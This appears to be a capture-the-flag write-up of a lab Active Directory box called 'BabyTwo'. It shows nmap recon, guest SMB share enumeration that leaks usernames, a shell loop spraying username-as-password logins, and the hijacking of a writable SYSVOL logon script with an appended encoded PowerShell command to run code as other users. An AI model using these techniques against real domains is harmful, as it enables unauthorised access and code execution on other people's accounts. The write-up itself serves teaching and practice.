## Overview

BabyTwo is a medium-difficulty Windows box built around an Active Directory domain controller. The route to user is a clean chain of cheap mistakes: the SMB `guest` account is left enabled and exposes a share that leaks every valid username, a few accounts use their own username as their password, and one of those accounts can write to a domain logon script. Because logon scripts execute automatically as whoever logs in, writing to that script is code execution as another user. This post covers recon through `user.txt`.

Enumeration-led AD box: guest SMB leaks the user list, a username-equals-password spray lands access, and a writable SYSVOL logon script is hijacked for code execution; realistic misconfigs, no CVE.

## Recon

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 / 139 / 445 | RPC / NetBIOS / SMB |
| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |
| 464 | kpasswd |
| 593 / 9389 | RPC-over-HTTP / ADWS |
| 5985 | WinRM |

```bash
nmap -p- --min-rate=1000 -Pn -T4 10.129.7.189
nmap -p53,88,135,139,389,445,464,593,636,3268,5985,9389 -Pn -sC -sV 10.129.7.189
```

The port profile — DNS, Kerberos, LDAP and SMB together — is a textbook domain controller. The LDAP certificate reveals the domain `baby2.vl` and DC hostname `dc.baby2.vl`. Everything that follows is reachable by IP, so no `/etc/hosts` entry is strictly required.

## Enumeration

SMB is the loudest target on a DC, so start there. The `guest` account turns out to be enabled, which is enough to list shares and browse the readable ones.

```bash
smbclient -L //10.129.7.189 -U 'guest%'
smbclient //10.129.7.189/homes -U 'guest%' -c 'ls'
```

The `homes` share contains one folder per user. That is effectively the domain's user list handed over for free — save each name to `users.txt`:

```
Amelia.Griffiths
Carl.Moore
Harry.Shaw
Joan.Jennings
Joel.Hurst
Kieran.Mitchell
library
Lynda.Bailey
Mohammed.Harris
Nicola.Lamb
Ryan.Jenkins
```

## Foothold

With real usernames in hand, the cheapest credential attack is to try each username as its own password — one attempt per account, so no lockout risk. (`netexec`/`nxc` was unusable on this host, so a plain `smbclient` loop does the same job.)

```bash
while read u; do
  smbclient //10.129.7.189/IPC$ -U "baby2.vl\\$u%$u" -c quit >/dev/null 2>/dev/null \
    && echo "[+] $u:$u"
done < users.txt
# [+] Carl.Moore:Carl.Moore
# [+] library:library
```

`Carl.Moore:Carl.Moore` is a valid login. Enumerating shares as that user shows write access where it matters — the `SYSVOL` logon-script directory. Grab the existing script:

```bash
smbclient //10.129.7.189/SYSVOL -U 'Carl.Moore%Carl.Moore' \
  -c 'cd baby2.vl\scripts; get login.vbs login.vbs.orig'
```

`login.vbs` is a domain logon script — it runs automatically, in the context of whichever user logs in. Since `Carl.Moore` can overwrite it, we append a single self-contained PowerShell command (base64-encoded, fired via `WScript.Shell.Run`). A one-shot payload is the right tool here: the script only executes when a victim logs in, so there is no live session to attach an interactive shell to. The payload simply copies `C:\user.txt` out to a share we can already read.

```bash
# build the tampered login.vbs (orig + one CreateObject(...).Run "powershell -e <b64>" line), then:
smbclient //10.129.7.189/SYSVOL -U 'Carl.Moore%Carl.Moore' \
  -c 'cd baby2.vl\scripts; del login.vbs; put login.vbs login.vbs'
```

A minute or two later a user logs in, the logon script runs our payload in their context, and the flag drops into a readable location.

## User flag

```bash
smbclient //10.129.7.189/homes -U 'Carl.Moore%Carl.Moore' -c 'get u.txt user.txt'
cat user.txt   # HTB{...}
```

The logon-script payload executed as `amelia.griffiths` and surrendered `user.txt`.

Privilege escalation is left as an exercise — this post stops at user.
